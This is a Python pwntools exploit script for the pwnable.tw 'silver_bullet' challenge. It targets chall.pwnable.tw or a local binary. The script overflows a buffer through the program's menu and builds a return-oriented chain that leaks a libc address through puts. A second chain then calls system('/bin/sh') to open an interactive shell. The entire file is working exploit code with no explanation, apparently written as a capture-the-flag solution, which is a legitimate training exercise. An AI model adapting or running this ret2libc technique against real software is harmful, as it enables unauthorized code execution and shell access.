#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./silver_bullet"
elf=ELF(pwn_file)
libc=ELF("./libc_32.so.6")
#libc=ELF("/lib/i386-linux-gnu/libc-2.23.so")

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10103)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def create(data):
    r.sendafter("choice :", '1')
    r.sendafter("bullet :", data)

def powerup(data):
    r.sendafter("choice :", '2')
    r.sendafter("bullet :", data)

def beat():
    r.sendafter("choice :", '3')

main = 0x08048954

debug()
create('a'*0x2f)
powerup('a'*0x1)
sh = '\xaa'*7
sh += p32(elf.plt['puts'])
sh += p32(main)
sh += p32(elf.got['puts'])
powerup(sh)
beat()

r.recvuntil("Oh ! You win !!\n")
a = u32(r.recv(4)) - libc.sym['puts']
libc.address = a
success("libc:  " + hex(a))

create('a'*0x2f)
powerup('a'*0x1)
sh = '\xaa'*7
sh += p32(libc.sym['system'])
sh += p32(0xdeadbeef)
sh += p32(libc.search("/bin/sh").next())
powerup(sh)
beat()

r.interactive()
